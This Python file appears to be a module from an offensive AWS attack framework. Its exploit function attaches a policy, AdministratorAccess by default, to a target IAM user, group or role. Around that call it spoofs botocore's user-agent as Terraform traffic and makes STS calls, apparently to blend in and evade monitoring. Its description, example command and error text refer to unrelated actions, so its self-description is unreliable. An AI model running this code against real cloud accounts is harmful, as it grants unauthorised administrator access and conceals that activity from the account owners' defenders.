import os.path
import sys

from termcolor import colored
from datetime import datetime
import json
from pydoc import pipepager

from core.createSession.giveMeClient import giveMeClient

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
    "SERVICE": {
        "value": "iam",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "POLICY-ARN": {
        "value": "arn:aws:iam::aws:policy/AdministratorAccess",
        "required": "true",
        "description": "The policy to attach. By default it's Administrator Policy"
    },
    "IDENTITY-NAME": {
        "value": "",
        "required": "true",
        "description": "The name of identity to attach the policy to."
    },
    "IDENTITY-TYPE": {
        "value": "",
        "required": "true",
        "choices": ['user', 'group', 'role'],
        "description": "The identity type. It should be one of user, group, role"
    }
}
description = "If an IAM user is not allowed to access the Management Console, you can allow it using a password you want."

aws_command = "aws iam create-login-profile --user-name <user> --password <password> <--password-reset-required OR --no-password-reset-required> --region <region> --profile <profile>"
def attachPolicy(idname, idtype, polarn, profile):
    try:
        if idtype == "user":
            profile.attach_user_policy(
                PolicyArn=polarn,
                UserName=idname
            )
        elif idtype == "group":
            profile.attach_group_policy(
                PolicyArn=polarn,
                GroupName=idname
            )
        elif idtype == "role":
            profile.attach_role_policy(
                PolicyArn=polarn,
                RoleName=idname
            )
        return {
            "Identity": idname,
            "PolicyArn": polarn,
            "Status": "Attached Successfully"
        }
    except:
        return {
            "error": f"Error Attaching: {str(sys.exc_info())}"
        }

def exploit(all_sessions, cred_prof, useragent, web_proxies, workspace):
    policy_arn = variables['POLICY-ARN']['value']
    id_name = variables['IDENTITY-NAME']['value']
    id_type = variables['IDENTITY-TYPE']['value']
    currentua = None
    try:
        if os.path.exists(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent"):
            with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "r") as uafile:
                currentua = uafile.read().replace("\n", "").strip()

        with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
            uafile.write(
                "APN/1.0 HashiCorp/1.0 Terraform/1.8.5 (+https://www.terraform.io) terraform-provider-aws/5.57.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/sts#1.30.1"
            )

        stsprofile = giveMeClient(
            all_sessions=all_sessions,
            cred_prof=cred_prof,
            useragent=useragent,
            web_proxies=web_proxies,
            service="sts"
        )
        stsprofile.get_caller_identity()

        with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
            uafile.write(
                "APN/1.0 HashiCorp/1.0 Terraform/1.8.5 (+https://www.terraform.io) terraform-provider-aws/5.57.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/iam#1.30.1"
            )

        iamprofile = giveMeClient(
            all_sessions=all_sessions,
            cred_prof=cred_prof,
            useragent=useragent,
            web_proxies=web_proxies,
            service="iam"
        )

        response = attachPolicy(idname=id_name, idtype=id_type, polarn=policy_arn, profile=iamprofile)

        with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
            uafile.write(
                "APN/1.0 HashiCorp/1.0 Terraform/1.8.5 (+https://www.terraform.io) terraform-provider-aws/5.57.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/sts#1.30.1"
            )

        stsprofile = giveMeClient(
            all_sessions=all_sessions,
            cred_prof=cred_prof,
            useragent=useragent,
            web_proxies=web_proxies,
            service="sts"
        )
        stsprofile.get_caller_identity()
        if currentua is not None:
            with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
                uafile.write(currentua)
        else:
            os.remove(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent")

        return response
    except:
        return {
            "error": f"Error Creating Version for Policy {policy_arn}: {str(sys.exc_info())}"
        }